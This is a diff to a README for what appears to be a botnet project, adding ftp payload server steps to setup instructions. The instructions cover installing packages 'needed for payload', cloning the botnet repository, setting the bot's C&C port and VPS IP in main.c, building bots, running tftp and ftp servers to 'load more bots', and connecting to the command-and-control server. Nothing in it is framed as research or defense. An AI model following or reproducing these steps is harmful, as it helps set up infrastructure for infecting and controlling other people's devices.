@@ -5,6 +5,7 @@
 - `apt-get install curl -y` (Needed for payload)
 - `apt-get install apache2 -y` (Needed for payload)
 - `apt-get install tftpd-hpa -y` (Optional if you need tftp payload)
+- `apt-get install vsftpd -y` (Optional if you need ftp payload)
 
 # Steps:
 - git clone https://github.com/NoSpacesFlies/Botnet/
@@ -16,6 +17,7 @@
 - Edit main.c in /bot directory to your bot port and vps ip
 - sh legacybotbuilder.sh
 - sh tftpserver.sh  (Optional step but may help load more bots with bigger payload)
+- sh ftpserver.sh   (Optional step for ftp payloads)
 
 # Connecting
 - Putty raw using vps ip + cnc port
